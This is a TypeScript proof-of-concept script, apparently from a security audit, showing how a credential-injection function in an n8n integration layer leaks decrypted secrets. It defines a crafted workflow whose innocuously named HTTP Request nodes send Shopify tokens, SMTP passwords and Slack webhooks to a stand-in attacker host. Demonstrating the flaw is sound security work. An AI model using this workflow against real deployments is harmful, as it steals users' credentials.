/**
 * Proof-of-Concept: H-05 Credential Exfiltration via Crafted Workflow Nodes
 *
 * An authenticated user can POST to /api/n8n (action=create) or /api/n8n/orchestrate
 * with a workflow JSON that contains credential placeholder tokens in an HTTP Request node.
 *
 * deepInject() in lib/integrations.ts traverses ALL nodes unconditionally and replaces
 * {{ $env.* }} / {{ user.* }} patterns in every string it finds — regardless of which
 * node type the string lives in.
 *
 * Result: real decrypted credentials (Shopify API keys, SMTP passwords, Airtable tokens,
 * Slack webhook URLs) are baked into the HTTP Request node's URL/headers/body and sent
 * to n8n verbatim. When n8n executes the workflow, the HTTP Request fires and delivers
 * all matching credentials to the attacker-controlled URL.
 *
 * Run: npx tsx scripts/poc-credential-exfiltration.ts
 */

// Import directly so this PoC works without a running server.
// @ts-ignore — no server-only boundary in this script
import { injectCredentialsIntoWorkflow, type IntegrationRecord } from '../lib/integrations';

// ── Victim's connected integrations (as returned by the DB after decryption) ──

const victimIntegrations: IntegrationRecord[] = [
  {
    provider: 'shopify' as const,
    credentials: {
      admin_access_token: 'shpat_REAL_SECRET_TOKEN_abc123',
      shop_domain: 'victim-store.myshopify.com',
    },
  },
  {
    provider: 'slack' as const,
    credentials: {
      webhook_url: 'https://hooks.slack.com/services/T000/B000/REAL_WEBHOOK_SECRET',
    },
  },
  {
    provider: 'gmail' as const,
    credentials: {
      smtp_user: 'victim@example.com',
      smtp_pass: 'REAL_SMTP_PASSWORD_xyz789',
    },
  },
];

// ── Attacker-crafted workflow ─────────────────────────────────────────────────
//
// The attacker is an authenticated user. They submit this workflow JSON to
// POST /api/n8n  { action: "create", workflow: <below> }
//
// The key: placeholders {{ $env.SHOPIFY_ACCESS_TOKEN }} etc. are placed inside
// an HTTP Request node — not inside a Shopify/Slack/SMTP node.

const maliciousWorkflow = {
  name: 'legitimate-looking workflow',
  nodes: [
    {
      // This node type is generic — matches no known integration provider.
      // deepInject() still runs over it because it runs over ALL nodes.
      id: 'node-exfil',
      name: 'Health Check',
      type: 'n8n-nodes-base.httpRequest',
      typeVersion: 4,
      position: [250, 300],
      parameters: {
        method: 'GET',
        // All three placeholders will be substituted with real values:
        url: 'https://attacker.example.com/collect' +
             '?shopify_token={{ $env.SHOPIFY_ACCESS_TOKEN }}' +
             '&shopify_key={{ $env.SHOPIFY_API_KEY }}' +
             '&smtp_pass={{ $env.SMTP_PASS }}' +
             '&smtp_user={{ $env.SMTP_USER }}' +
             '&slack_webhook={{ $env.SLACK_WEBHOOK_URL }}',
        options: {},
      },
    },
    {
      // Second variant: using {{ user.* }} patterns
      id: 'node-exfil-2',
      name: 'Analytics Ping',
      type: 'n8n-nodes-base.httpRequest',
      typeVersion: 4,
      position: [450, 300],
      parameters: {
        method: 'POST',
        url: 'https://attacker.example.com/ping',
        sendBody: true,
        contentType: 'json',
        jsonBody: JSON.stringify({
          // user.* variants also get substituted
          shopify_token: '{{ user.shopify.token }}',
          shopify_store: '{{ user.shopify.store_url }}',
          slack_hook:    '{{ user.slack.webhook_url }}',
          smtp_pass:     '{{ user.email.smtp_pass }}',
        }),
      },
    },
  ],
  connections: {},
};

// ── Execute the injection (the exact code path used by both API routes) ───────

console.log('\n=== Proof of Concept: H-05 Credential Exfiltration via Workflow Node ===\n');
console.log('Before injection (attacker-submitted URL):');
console.log(' ', (maliciousWorkflow.nodes[0].parameters as { url: string }).url);

const result = injectCredentialsIntoWorkflow(maliciousWorkflow, victimIntegrations);
const nodes = (result.nodes ?? []) as Array<{ name: string; parameters: Record<string, unknown> }>;

const node1 = nodes.find(n => n.name === 'Health Check');
const node2 = nodes.find(n => n.name === 'Analytics Ping');

console.log('\nAfter injection (what gets sent to n8n):');
console.log('\n[Node 1] URL with real credentials substituted:');
console.log(' ', node1?.parameters.url);

console.log('\n[Node 2] JSON body with real credentials substituted:');
try {
  const body = JSON.parse(node2?.parameters.jsonBody as string ?? '{}');
  console.log(' ', JSON.stringify(body, null, 2));
} catch {
  console.log(' ', node2?.parameters.jsonBody);
}

// ── Verdict ───────────────────────────────────────────────────────────────────

const url = String(node1?.parameters.url ?? '');
const exploitSucceeded =
  url.includes('shpat_REAL_SECRET_TOKEN_abc123') &&
  url.includes('REAL_SMTP_PASSWORD_xyz789') &&
  url.includes('hooks.slack.com');

console.log('\n─────────────────────────────────────────────────');
if (exploitSucceeded) {
  console.log('EXPLOIT SUCCEEDED — real credentials are in the n8n workflow.');
  console.log('When n8n executes, GET https://attacker.example.com/collect fires');
  console.log('with Shopify token, SMTP password, and Slack webhook in plaintext.');
  process.exitCode = 1;
} else {
  console.log('Exploit BLOCKED — no real credentials present in injected workflow.');
  process.exitCode = 0;
}
